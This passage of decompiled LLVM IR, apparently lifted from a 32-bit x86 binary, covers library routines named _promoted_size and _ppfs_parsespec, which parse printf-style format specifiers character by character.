  %v0_805d180.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d17e

dec_label_pc_805d17e:                             ; preds = %dec_label_pc_805d163, %dec_label_pc_805d16a
  %v0_805d180 = phi i32 [ %v3_805d163, %dec_label_pc_805d163 ], [ %v0_805d180.pre, %dec_label_pc_805d16a ]
  %v2_805d17e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_805d17e, i32* @ebx, align 4
  ret i32 %v0_805d180

; uselistorder directives
  uselistorder i32 %v3_805d159, { 1, 0 }
  uselistorder i32 %v3_805d142, { 1, 0 }
  uselistorder i32 %v1_805d12d, { 2, 1, 0 }
  uselistorder i32 %v1_805d12e, { 1, 2, 0 }
  uselistorder i32 %v3_805d0c4, { 1, 0, 2 }
  uselistorder i32* %v2_805d0c4, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_805d0bf, { 1, 0 }
  uselistorder i32 %v6_805d0bb, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805d0bb21, { 1, 0 }
  uselistorder i32 %v1_805d12e15, { 2, 0, 1 }
  uselistorder i1 %v1_805d13c, { 1, 0 }
  uselistorder i32* %esi.global-to-local, { 2, 1, 0 }
  uselistorder i32* %edx.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7, 8, 9, 10 }
  uselistorder i32* %ebx.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 6, 5, 8, 7 }
  uselistorder label %dec_label_pc_805d17e, { 1, 0 }
  uselistorder label %dec_label_pc_805d163, { 0, 2, 1 }
  uselistorder label %dec_label_pc_805d14c, { 1, 0 }
  uselistorder label %dec_label_pc_805d12d, { 1, 0 }
  uselistorder label %dec_label_pc_805d12a, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_805d120, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805d0bb, { 1, 0 }
  uselistorder label %dec_label_pc_805d0b7, { 1, 0 }
  uselistorder label %dec_label_pc_805d09d, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805d184 = load i32, i32* @eax, align 4
  br label %dec_label_pc_805d18b

dec_label_pc_805d18b:                             ; preds = %dec_label_pc_805d18b, %entry
  %v0_805d18b = phi i32 [ ptrtoint (i8** @global_var_806d97e.651 to i32), %entry ], [ %v1_805d18b, %dec_label_pc_805d18b ]
  %v1_805d18b = add i32 %v0_805d18b, -2
  %v1_805d18e = inttoptr i32 %v1_805d18b to i16*
  %v2_805d18e = load i16, i16* %v1_805d18e, align 2
  %v3_805d18e = sext i16 %v2_805d18e to i32
  %v12_805d191 = icmp ne i32 %v3_805d18e, %v0_805d184
  %v6_805d19b = icmp ugt i32 %v1_805d18b, ptrtoint (i32* @global_var_806d966.652 to i32)
  %or.cond = and i1 %v6_805d19b, %v12_805d191
  br i1 %or.cond, label %dec_label_pc_805d18b, label %dec_label_pc_805d19d

dec_label_pc_805d19d:                             ; preds = %dec_label_pc_805d18b
  %.pre = add i32 %v0_805d18b, -134666600
  %v2_805d1a3 = sdiv i32 %.pre, 2
  store i32 %v2_805d1a3, i32* @edx, align 4
  %v1_805d1a5 = add i32 %v2_805d1a3, ptrtoint (i8** @global_var_806d97e.651 to i32)
  %v2_805d1a5 = inttoptr i32 %v1_805d1a5 to i8*
  %v3_805d1a5 = load i8, i8* %v2_805d1a5, align 1
  %v4_805d1a5 = zext i8 %v3_805d1a5 to i32
  ret i32 %v4_805d1a5

; uselistorder directives
  uselistorder i32 %v2_805d1a3, { 1, 0 }
  uselistorder i32 %v1_805d18b, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_806d97e.651 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_805d1ae = load i32, i32* @edi, align 4
  %v0_805d1af = load i32, i32* @esi, align 4
  %v0_805d1b0 = load i32, i32* @ebx, align 4
  store i32 %v0_805d1b0, i32* %stack_var_-16, align 4
  %v4_805d1b0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_805d1dc = add i32 %tmp76, 24
  %v2_805d1dc = inttoptr i32 %v1_805d1dc to i32*
  %v3_805d1dc = load i32, i32* %v2_805d1dc, align 4
  store i32 %v3_805d1dc, i32* %eax.global-to-local, align 4
  %v1_805d1e3 = add i32 %tmp76, 16
  %v2_805d1e3 = inttoptr i32 %v1_805d1e3 to i32*
  %v3_805d1e3 = load i32, i32* %v2_805d1e3, align 4
  %v1_805d1e6 = and i32 %v3_805d1e3, 128
  %v2_805d1e6 = icmp eq i32 %v1_805d1e6, 0
  store i32 %v1_805d1e6, i32* %edi.global-to-local, align 4
  %v1_805d1ec = icmp eq i1 %v2_805d1e6, false
  br i1 %v1_805d1ec, label %dec_label_pc_805d1ff, label %dec_label_pc_805d1ee

dec_label_pc_805d1ee:                             ; preds = %entry
  %v2_805d1ee = load i32, i32* %arg1, align 4
  br label %dec_label_pc_805d24c.outer

dec_label_pc_805d1f9:                             ; preds = %dec_label_pc_805d387
  %v1_805d1f9 = add i32 %v0_805d387.pre.pre, 1
  store i32 %v1_805d1f9, i32* @esi, align 4
  br label %dec_label_pc_805d397

dec_label_pc_805d1ff:                             ; preds = %entry
  %v15_805d1b1 = ptrtoint i32* %stack_var_-108 to i32
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805d201

dec_label_pc_805d201:                             ; preds = %dec_label_pc_805d229.dec_label_pc_805d201_crit_edge, %dec_label_pc_805d1ff
  %v2_805d212 = phi i32 [ %v2_805d212.pre, %dec_label_pc_805d229.dec_label_pc_805d201_crit_edge ], [ %v15_805d1b1, %dec_label_pc_805d1ff ]
  %v3_805d212 = phi i32 [ %v1_805d229, %dec_label_pc_805d229.dec_label_pc_805d201_crit_edge ], [ 0, %dec_label_pc_805d1ff ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_805d205 = mul i32 %v3_805d212, 4
  store i32 %v1_805d205, i32* @ecx, align 4
  %v2_805d20c = load i32, i32* %arg1, align 4
  store i32 %v2_805d20c, i32* @edx, align 4
  %v2_805d20e = add i32 %v1_805d205, -4
  %v3_805d20e = add i32 %v2_805d20e, %v2_805d20c
  %v4_805d20e = inttoptr i32 %v3_805d20e to i32*
  %v5_805d20e = load i32, i32* %v4_805d20e, align 4
  store i32 %v5_805d20e, i32* %eax.global-to-local, align 4
  %v1_805d212 = trunc i32 %v5_805d20e to i8
  %v4_805d212 = add i32 %v2_805d212, 36
  %v5_805d212 = add i32 %v4_805d212, %v3_805d212
  %v6_805d212 = inttoptr i32 %v5_805d212 to i8*
  store i8 %v1_805d212, i8* %v6_805d212, align 1
  %v0_805d216 = load i32, i32* %eax.global-to-local, align 4
  %v1_805d216 = urem i32 %v0_805d216, 256
  %v2_805d216 = load i32, i32* @ebx, align 4
  %v3_805d216 = and i32 %v2_805d216, -256
  %v4_805d216 = or i32 %v3_805d216, %v1_805d216
  store i32 %v4_805d216, i32* @ebx, align 4
  %v1_805d218 = mul i32 %v0_805d216, 16777216
  %v2_805d218 = sdiv i32 %v1_805d218, 16777216
  store i32 %v2_805d218, i32* %eax.global-to-local, align 4
  %v1_805d21b = load i32, i32* @edx, align 4
  %v2_805d21b = load i32, i32* @ecx, align 4
  %v3_805d21b = add i32 %v1_805d21b, -4
  %v4_805d21b = add i32 %v3_805d21b, %v2_805d21b
  %v5_805d21b = inttoptr i32 %v4_805d21b to i32*
  %v6_805d21b = load i32, i32* %v5_805d21b, align 4
  %v17_805d21b = icmp eq i32 %v2_805d218, %v6_805d21b
  %v1_805d21f = icmp eq i1 %v17_805d21b, false
  br i1 %v1_805d21f, label %dec_label_pc_805d571, label %dec_label_pc_805d225

dec_label_pc_805d225:                             ; preds = %dec_label_pc_805d201
  %v3_805d225 = trunc i32 %v0_805d216 to i8
  %v4_805d225 = icmp eq i8 %v3_805d225, 0
  br i1 %v4_805d225, label %dec_label_pc_805d22f, label %dec_label_pc_805d229

dec_label_pc_805d229:                             ; preds = %dec_label_pc_805d225
  %v0_805d229 = load i32, i32* %esi.global-to-local, align 4
  %v1_805d229 = add i32 %v0_805d229, 1
  store i32 %v1_805d229, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_805d229, 32
  br i1 %tmp, label %dec_label_pc_805d229.dec_label_pc_805d201_crit_edge, label %dec_label_pc_805d22f

dec_label_pc_805d229.dec_label_pc_805d201_crit_edge: ; preds = %dec_label_pc_805d229
  %v2_805d212.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805d201

dec_label_pc_805d22f:                             ; preds = %dec_label_pc_805d229, %dec_label_pc_805d225
  %v2_805d234 = ptrtoint i32* %stack_var_-71 to i32
  br label %dec_label_pc_805d24c.outer

dec_label_pc_805d24c.outer:                       ; preds = %dec_label_pc_805d22f, %dec_label_pc_805d1ee, %dec_label_pc_805d369
  %v0_805d258.ph94 = phi i32 [ %v1_805d369, %dec_label_pc_805d369 ], [ %v2_805d1ee, %dec_label_pc_805d1ee ], [ %v2_805d234, %dec_label_pc_805d22f ]
  %stack_var_-32.1.ph = phi i32 [ %stack_var_-32.3, %dec_label_pc_805d369 ], [ %tmp66, %dec_label_pc_805d1ee ], [ %tmp66, %dec_label_pc_805d22f ]
  %stack_var_-96.1.ph = phi i32 [ %v0_805d1f2, %dec_label_pc_805d369 ], [ 0, %dec_label_pc_805d1ee ], [ 0, %dec_label_pc_805d22f ]
  %stack_var_-88.1.ph = phi i32 [ %stack_var_-88.3, %dec_label_pc_805d369 ], [ %v3_805d1dc, %dec_label_pc_805d1ee ], [ %v3_805d1dc, %dec_label_pc_805d22f ]
  %stack_var_-92.1.ph = phi i64 [ -1, %dec_label_pc_805d369 ], [ 0, %dec_label_pc_805d1ee ], [ 0, %dec_label_pc_805d22f ]
  %v7_805d253 = mul nsw i64 %stack_var_-92.1.ph, -4
  %v8_805d253 = trunc i64 %v7_805d253 to i32
  %v2_805d25b = add i32 %v8_805d253, 80
  br label %dec_label_pc_805d24c

dec_label_pc_805d24c:                             ; preds = %dec_label_pc_805d24c.outer, %dec_label_pc_805d309
  %v0_805d258 = phi i32 [ %v0_805d316, %dec_label_pc_805d309 ], [ %v0_805d258.ph94, %dec_label_pc_805d24c.outer ]
  %stack_var_-32.1 = phi i32 [ %stack_var_-32.2, %dec_label_pc_805d309 ], [ %stack_var_-32.1.ph, %dec_label_pc_805d24c.outer ]
  %stack_var_-88.1 = phi i32 [ %stack_var_-88.2, %dec_label_pc_805d309 ], [ %stack_var_-88.1.ph, %dec_label_pc_805d24c.outer ]
  store i32 %v0_805d258, i32* @edx, align 4
  %v1_805d24c = inttoptr i32 %v0_805d258 to i8*
  %v2_805d24c = load i8, i8* %v1_805d24c, align 1
  %v11_805d24c = icmp eq i8 %v2_805d24c, 42
  store i32 %v0_805d258, i32* @esi, align 4
  %v1_805d251 = icmp eq i1 %v11_805d24c, false
  br i1 %v1_805d251, label %dec_label_pc_805d263, label %dec_label_pc_805d253

dec_label_pc_805d253:                             ; preds = %dec_label_pc_805d24c
  store i32 %v8_805d253, i32* %eax.global-to-local, align 4
  %v1_805d258 = add i32 %v0_805d258, 1
  store i32 %v1_805d258, i32* @esi, align 4
  %v0_805d25b = load i32, i32* @esp, align 4
  %v3_805d25b = add i32 %v2_805d25b, %v0_805d25b
  %v4_805d25b = inttoptr i32 %v3_805d25b to i32*
  store i32 0, i32* %v4_805d25b, align 4
  %v0_805d27d.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d263

dec_label_pc_805d263:                             ; preds = %dec_label_pc_805d24c, %dec_label_pc_805d253
  %v0_805d27d.pre = phi i32 [ %v0_805d258, %dec_label_pc_805d24c ], [ %v0_805d27d.pre.pre, %dec_label_pc_805d253 ]
  %v0_805d263 = load i32, i32* inttoptr (i32 134698560 to i32*), align 64
  store i32 %v0_805d263, i32* %ebp.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_805d27d.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d27d

dec_label_pc_805d26d:                             ; preds = %dec_label_pc_805d27d
  %v1_805d26d = add i32 %v1_805d275, -4094
  %v6_805d26d = sub i32 4093, %v1_805d275
  %v7_805d26d = and i32 %v6_805d26d, %v1_805d275
  %v8_805d26d = icmp slt i32 %v7_805d26d, 0
  %v9_805d26d = icmp eq i32 %v1_805d26d, 0
  %v10_805d26d = icmp slt i32 %v1_805d26d, 0
  %v3_805d273 = icmp eq i1 %v10_805d26d, %v8_805d26d
  %v4_805d273 = icmp eq i1 %v9_805d26d, false
  %v5_805d273 = and i1 %v4_805d273, %v3_805d273
  br i1 %v5_805d273, label %dec_label_pc_805d27c, label %dec_label_pc_805d275

dec_label_pc_805d275:                             ; preds = %dec_label_pc_805d26d
  %v3_805d275 = mul i32 %v1_805d275, 10
  store i32 %v3_805d275, i32* %eax.global-to-local, align 4
  %v2_805d278 = add i32 %v3_805d275, -48
  %v3_805d278 = add i32 %v2_805d278, %v2_805d27f
  store i32 %v3_805d278, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805d27c

dec_label_pc_805d27c:                             ; preds = %dec_label_pc_805d26d, %dec_label_pc_805d275
  %v0_805d29732 = phi i32 [ %v1_805d275, %dec_label_pc_805d26d ], [ %v3_805d278, %dec_label_pc_805d275 ]
  %v4_805d27d28 = phi i32 [ %v6_805d27d, %dec_label_pc_805d26d ], [ %v3_805d275, %dec_label_pc_805d275 ]
  %v1_805d27c = add i32 %v0_805d27c, 1
  store i32 %v1_805d27c, i32* @esi, align 4
  br label %dec_label_pc_805d27d

dec_label_pc_805d27d:                             ; preds = %dec_label_pc_805d263, %dec_label_pc_805d27c
  %v1_805d275 = phi i32 [ 0, %dec_label_pc_805d263 ], [ %v0_805d29732, %dec_label_pc_805d27c ]
  %v4_805d27d = phi i32 [ %v4_805d27d.pre, %dec_label_pc_805d263 ], [ %v4_805d27d28, %dec_label_pc_805d27c ]
  %v0_805d27c = phi i32 [ %v0_805d27d.pre, %dec_label_pc_805d263 ], [ %v1_805d27c, %dec_label_pc_805d27c ]
  %v1_805d27d = inttoptr i32 %v0_805d27c to i8*
  %v2_805d27d = load i8, i8* %v1_805d27d, align 1
  %v3_805d27d = zext i8 %v2_805d27d to i32
  %v5_805d27d = and i32 %v4_805d27d, -256
  %v6_805d27d = or i32 %v3_805d27d, %v5_805d27d
  store i32 %v6_805d27d, i32* %eax.global-to-local, align 4
  %v2_805d27f = sext i8 %v2_805d27d to i32
  store i32 %v2_805d27f, i32* @ecx, align 4
  %v2_805d282 = mul nsw i32 %v2_805d27f, 2
  %v3_805d282 = add i32 %v2_805d282, %v0_805d263
  %v4_805d282 = inttoptr i32 %v3_805d282 to i8*
  %v5_805d282 = load i8, i8* %v4_805d282, align 1
  %v6_805d282 = and i8 %v5_805d282, 8
  %v7_805d282 = icmp eq i8 %v6_805d282, 0
  %v1_805d287 = icmp eq i1 %v7_805d282, false
  br i1 %v1_805d287, label %dec_label_pc_805d26d, label %dec_label_pc_805d289

dec_label_pc_805d289:                             ; preds = %dec_label_pc_805d27d
  %v0_805d289 = load i32, i32* @edx, align 4
  %v1_805d289 = add i32 %v0_805d289, -1
  %v2_805d289 = inttoptr i32 %v1_805d289 to i8*
  %v3_805d289 = load i8, i8* %v2_805d289, align 1
  %v12_805d289 = icmp eq i8 %v3_805d289, 37
  %v1_805d28d = icmp eq i1 %v12_805d289, false
  br i1 %v1_805d28d, label %dec_label_pc_805d320, label %dec_label_pc_805d293

dec_label_pc_805d293:                             ; preds = %dec_label_pc_805d289
  %v10_805d293 = icmp eq i8 %v2_805d27d, 36
  %v1_805d295 = icmp eq i1 %v10_805d293, false
  br i1 %v1_805d295, label %dec_label_pc_805d2c7, label %dec_label_pc_805d297

dec_label_pc_805d297:                             ; preds = %dec_label_pc_805d293
  %tmp89 = icmp slt i32 %v1_805d275, 1
  br i1 %tmp89, label %dec_label_pc_805d2c7, label %dec_label_pc_805d29b

dec_label_pc_805d29b:                             ; preds = %dec_label_pc_805d297
  %v4_805d29b = icmp eq i32 %stack_var_-88.1, 0
  %v1_805d2a0 = add i32 %v0_805d27c, 1
  store i32 %v1_805d2a0, i32* @edx, align 4
  br i1 %v4_805d29b, label %dec_label_pc_805d571, label %dec_label_pc_805d2a9

dec_label_pc_805d2a9:                             ; preds = %dec_label_pc_805d29b
  store i32 %stack_var_-88.1, i32* %ecx.global-to-local, align 4
  %v2_805d2b1 = sub i32 %v1_805d275, %stack_var_-88.1
  %v8_805d2b1 = xor i32 %v1_805d275, %stack_var_-88.1
  %v9_805d2b1 = xor i32 %v2_805d2b1, %v1_805d275
  %v10_805d2b1 = and i32 %v9_805d2b1, %v8_805d2b1
  %v11_805d2b1 = icmp slt i32 %v10_805d2b1, 0
  %v12_805d2b1 = icmp eq i32 %v2_805d2b1, 0
  %v13_805d2b1 = icmp slt i32 %v2_805d2b1, 0
  %v3_805d2b3 = icmp ne i1 %v13_805d2b1, %v11_805d2b1
  %v4_805d2b3 = or i1 %v12_805d2b1, %v3_805d2b3
  %stack_var_-88.1.v0_805d2b5 = select i1 %v4_805d2b3, i32 %stack_var_-88.1, i32 %v1_805d275
  br label %dec_label_pc_805d2c3

dec_label_pc_805d2c3:                             ; preds = %dec_label_pc_805d2d7, %dec_label_pc_805d2a9, %dec_label_pc_805d2db
  %v0_805d2c3 = phi i32 [ %v1_805d2a0, %dec_label_pc_805d2a9 ], [ %v0_805d289, %dec_label_pc_805d2db ], [ %v0_805d289, %dec_label_pc_805d2d7 ]
  %stack_var_-32.2 = phi i32 [ %v1_805d275, %dec_label_pc_805d2a9 ], [ %stack_var_-32.1, %dec_label_pc_805d2db ], [ %stack_var_-32.1, %dec_label_pc_805d2d7 ]
  %stack_var_-88.2 = phi i32 [ %stack_var_-88.1.v0_805d2b5, %dec_label_pc_805d2a9 ], [ 0, %dec_label_pc_805d2db ], [ 0, %dec_label_pc_805d2d7 ]
  store i32 %v0_805d2c3, i32* @esi, align 4
  br label %dec_label_pc_805d2ea

dec_label_pc_805d2c7:                             ; preds = %dec_label_pc_805d297, %dec_label_pc_805d293
  %tmp90 = icmp slt i32 %stack_var_-88.1, 1
  br i1 %tmp90, label %dec_label_pc_805d2d7, label %dec_label_pc_805d2ce

dec_label_pc_805d2ce:                             ; preds = %dec_label_pc_805d2c7
  %v10_805d2ce = icmp eq i8 %v2_805d27d, 109
  br i1 %v10_805d2ce, label %dec_label_pc_805d320, label %dec_label_pc_805d571

dec_label_pc_805d2d7:                             ; preds = %dec_label_pc_805d2c7
  %tmp153 = icmp ugt i32 %v0_805d27c, %v0_805d289
  br i1 %tmp153, label %dec_label_pc_805d2db, label %dec_label_pc_805d2c3

dec_label_pc_805d2db:                             ; preds = %dec_label_pc_805d2d7
  %v1_805d2db = inttoptr i32 %v0_805d289 to i8*
  %v2_805d2db = load i8, i8* %v1_805d2db, align 1
  %v8_805d2db = icmp eq i8 %v2_805d2db, 48
  br i1 %v8_805d2db, label %dec_label_pc_805d2c3, label %dec_label_pc_805d320

dec_label_pc_805d2ea:                             ; preds = %dec_label_pc_805d2fb, %dec_label_pc_805d2c3
  %v0_805d316 = phi i32 [ %v1_805d2fb, %dec_label_pc_805d2fb ], [ %v0_805d2c3, %dec_label_pc_805d2c3 ]
  %v4_805d2f435 = phi i32 [ %v6_805d2f4, %dec_label_pc_805d2fb ], [ %v6_805d27d, %dec_label_pc_805d2c3 ]
  store i32 ptrtoint ([8 x i8]* @global_var_806d95e.655 to i32), i32* %edx.global-to-local, align 4
  %v1_805d2f7 = inttoptr i32 %v0_805d316 to i8*
  br label %dec_label_pc_805d2f4

dec_label_pc_805d2f4:                             ; preds = %dec_label_pc_805d305, %dec_label_pc_805d2ea
  %v4_805d2f4 = phi i32 [ %v4_805d2f435, %dec_label_pc_805d2ea ], [ %v6_805d2f4, %dec_label_pc_805d305 ]
  %v0_805d2f6 = phi i32 [ ptrtoint ([8 x i8]* @global_var_806d95e.655 to i32), %dec_label_pc_805d2ea ], [ %v1_805d2f6, %dec_label_pc_805d305 ]
  %v0_805d305 = phi i32 [ 1, %dec_label_pc_805d2ea ], [ %v2_805d305, %dec_label_pc_805d305 ]
  store i32 %v0_805d305, i32* @ecx, align 4
  %v1_805d2f4 = inttoptr i32 %v0_805d2f6 to i8*
  %v2_805d2f4 = load i8, i8* %v1_805d2f4, align 1
  %v3_805d2f4 = zext i8 %v2_805d2f4 to i32
  %v5_805d2f4 = and i32 %v4_805d2f4, -256
  %v6_805d2f4 = or i32 %v3_805d2f4, %v5_805d2f4
  store i32 %v6_805d2f4, i32* %eax.global-to-local, align 4
  %v1_805d2f6 = add i32 %v0_805d2f6, 1
  store i32 %v1_805d2f6, i32* @edx, align 4
  %v2_805d2f7 = load i8, i8* %v1_805d2f7, align 1
  %v15_805d2f7 = icmp eq i8 %v2_805d2f7, %v2_805d2f4
  %v1_805d2f9 = icmp eq i1 %v15_805d2f7, false
  br i1 %v1_805d2f9, label %dec_label_pc_805d300, label %dec_label_pc_805d2fb

dec_label_pc_805d2fb:                             ; preds = %dec_label_pc_805d2f4
  %v1_805d2fb = add i32 %v0_805d316, 1
  store i32 %v1_805d2fb, i32* @esi, align 4
  %v0_805d2fc = load i32, i32* %edi.global-to-local, align 4
  %v2_805d2fc = or i32 %v0_805d2fc, %v0_805d305
  store i32 %v2_805d2fc, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805d2ea

dec_label_pc_805d300:                             ; preds = %dec_label_pc_805d2f4
  %v1_805d300 = inttoptr i32 %v1_805d2f6 to i8*
  %v2_805d300 = load i8, i8* %v1_805d300, align 1
  %v3_805d300 = icmp eq i8 %v2_805d300, 0
  br i1 %v3_805d300, label %dec_label_pc_805d309, label %dec_label_pc_805d305

dec_label_pc_805d305:                             ; preds = %dec_label_pc_805d300
  %v2_805d305 = mul i32 %v0_805d305, 2
  br label %dec_label_pc_805d2f4

dec_label_pc_805d309:                             ; preds = %dec_label_pc_805d300
  %v0_805d309 = load i32, i32* %edi.global-to-local, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v1_805d30d = udiv i32 %v0_805d309, 2
  %v1_805d30d.not = or i32 %v1_805d30d, -6
  %v1_805d312 = xor i32 %v1_805d30d.not, 5
  store i32 %v1_805d312, i32* %eax.global-to-local, align 4
  %v2_805d314 = and i32 %v1_805d312, %v0_805d309
  store i32 %v2_805d314, i32* %edi.global-to-local, align 4
  %v1_805d316 = add i32 %v0_805d316, -1
  %v2_805d316 = inttoptr i32 %v1_805d316 to i8*
  %v3_805d316 = load i8, i8* %v2_805d316, align 1
  %v12_805d316 = icmp eq i8 %v3_805d316, 37
  %v1_805d31a = icmp eq i1 %v12_805d316, false
  br i1 %v1_805d31a, label %dec_label_pc_805d24c, label %dec_label_pc_805d320

dec_label_pc_805d320:                             ; preds = %dec_label_pc_805d2db, %dec_label_pc_805d309, %dec_label_pc_805d289, %dec_label_pc_805d2ce
  %v0_805d343 = phi i32 [ %v1_805d275, %dec_label_pc_805d2ce ], [ %v1_805d275, %dec_label_pc_805d2db ], [ 0, %dec_label_pc_805d309 ], [ %v1_805d275, %dec_label_pc_805d289 ]
  %v1_805d34c = phi i32 [ %v0_805d27c, %dec_label_pc_805d2ce ], [ %v0_805d27c, %dec_label_pc_805d2db ], [ %v0_805d316, %dec_label_pc_805d309 ], [ %v0_805d27c, %dec_label_pc_805d289 ]
  %v0_805d349 = phi i32 [ %v0_805d289, %dec_label_pc_805d2ce ], [ %v0_805d289, %dec_label_pc_805d2db ], [ %v1_805d2f6, %dec_label_pc_805d309 ], [ %v0_805d289, %dec_label_pc_805d289 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_805d2ce ], [ %stack_var_-32.1, %dec_label_pc_805d2db ], [ %stack_var_-32.2, %dec_label_pc_805d309 ], [ %stack_var_-32.1, %dec_label_pc_805d289 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_805d2ce ], [ 0, %dec_label_pc_805d2db ], [ %stack_var_-88.2, %dec_label_pc_805d309 ], [ %stack_var_-88.1, %dec_label_pc_805d289 ]
  %v1_805d320 = inttoptr i32 %v0_805d349 to i8*
  %v2_805d320 = load i8, i8* %v1_805d320, align 1
  %v11_805d320 = icmp eq i8 %v2_805d320, 42
  %v1_805d323 = icmp eq i1 %v11_805d320, false
  br i1 %v1_805d323, label %dec_label_pc_805d359, label %dec_label_pc_805d325

dec_label_pc_805d325:                             ; preds = %dec_label_pc_805d320
  %v4_805d325 = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_805d325, label %dec_label_pc_805d349, label %dec_label_pc_805d32c

dec_label_pc_805d32c:                             ; preds = %dec_label_pc_805d325
  %v1_805d32c = inttoptr i32 %v1_805d34c to i8*
  %v2_805d32c = load i8, i8* %v1_805d32c, align 1
  %v11_805d32c = icmp eq i8 %v2_805d32c, 36
  %v1_805d32f = icmp eq i1 %v11_805d32c, false
  br i1 %v1_805d32f, label %dec_label_pc_805d571, label %dec_label_pc_805d335

dec_label_pc_805d335:                             ; preds = %dec_label_pc_805d32c
  %tmp91 = icmp slt i32 %v0_805d343, 1
  br i1 %tmp91, label %dec_label_pc_805d571, label %dec_label_pc_805d33d

dec_label_pc_805d33d:                             ; preds = %dec_label_pc_805d335
  store i32 %v8_805d253, i32* %eax.global-to-local, align 4
  %v1_805d342 = add i32 %v1_805d34c, 1
  store i32 %v1_805d342, i32* @esi, align 4
  %v1_805d343 = load i32, i32* @esp, align 4
  %v3_805d343 = add i32 %v8_805d253, 68
  %v4_805d343 = add i32 %v3_805d343, %v1_805d343
  %v5_805d343 = inttoptr i32 %v4_805d343 to i32*
  store i32 %v0_805d343, i32* %v5_805d343, align 4
  %v0_805d387.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805d354

dec_label_pc_805d349:                             ; preds = %dec_label_pc_805d325
  %v1_805d349 = add i32 %v0_805d349, 1
  store i32 %v1_805d349, i32* %eax.global-to-local, align 4
  %v12_805d34c = icmp eq i32 %v1_805d349, %v1_805d34c
  %v1_805d34e = icmp eq i1 %v12_805d34c, false
  br i1 %v1_805d34e, label %dec_label_pc_805d571, label %dec_label_pc_805d354

dec_label_pc_805d354:                             ; preds = %dec_label_pc_805d349, %dec_label_pc_805d33d
  %v0_805d387.pre.pre.pre = phi i32 [ %v1_805d34c, %dec_label_pc_805d349 ], [ %v0_805d387.pre.pre.pre.pre, %dec_label_pc_805d33d ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805d359

dec_label_pc_805d359:                             ; preds = %dec_label_pc_805d320, %dec_label_pc_805d354
  %v0_805d387.pre.pre = phi i32 [ %v1_805d34c, %dec_label_pc_805d320 ], [ %v0_805d387.pre.pre.pre, %dec_label_pc_805d354 ]
  %v0_805d1f2 = phi i32 [ %v0_805d343, %dec_label_pc_805d320 ], [ -2147483648, %dec_label_pc_805d354 ]
  %v4_805d359 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_805d359 = icmp eq i32 %v4_805d359, 0
  %v1_805d35e = icmp eq i1 %v5_805d359, false
  %.pre = inttoptr i32 %v0_805d387.pre.pre to i8*
  br i1 %v1_805d35e, label %dec_label_pc_805d382, label %dec_label_pc_805d364

dec_label_pc_805d364:                             ; preds = %dec_label_pc_805d359
  %v2_805d364 = load i8, i8* %.pre, align 1
  %v11_805d364 = icmp eq i8 %v2_805d364, 46
  %v1_805d367 = icmp eq i1 %v11_805d364, false
  br i1 %v1_805d367, label %dec_label_pc_805d37b, label %dec_label_pc_805d369

dec_label_pc_805d369:                             ; preds = %dec_label_pc_805d364
  %v1_805d369 = add i32 %v0_805d387.pre.pre, 1
  store i32 %v1_805d369, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805d24c.outer

dec_label_pc_805d37b:                             ; preds = %dec_label_pc_805d364
  br label %dec_label_pc_805d382

dec_label_pc_805d382:                             ; preds = %dec_label_pc_805d359, %dec_label_pc_805d37b
  %stack_var_-96.2 = phi i32 [ %v0_805d1f2, %dec_label_pc_805d37b ], [ %stack_var_-96.1.ph, %dec_label_pc_805d359 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_805d37b ], [ %v0_805d1f2, %dec_label_pc_805d359 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_806d90c.656 to i32), i32* @edx, align 4
  %v4_805d387.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805d387

dec_label_pc_805d387:                             ; preds = %dec_label_pc_805d391, %dec_label_pc_805d382
  %v0_805d391 = phi i32 [ %v1_805d391, %dec_label_pc_805d391 ], [ ptrtoint ([9 x i8]* @global_var_806d90c.656 to i32), %dec_label_pc_805d382 ]
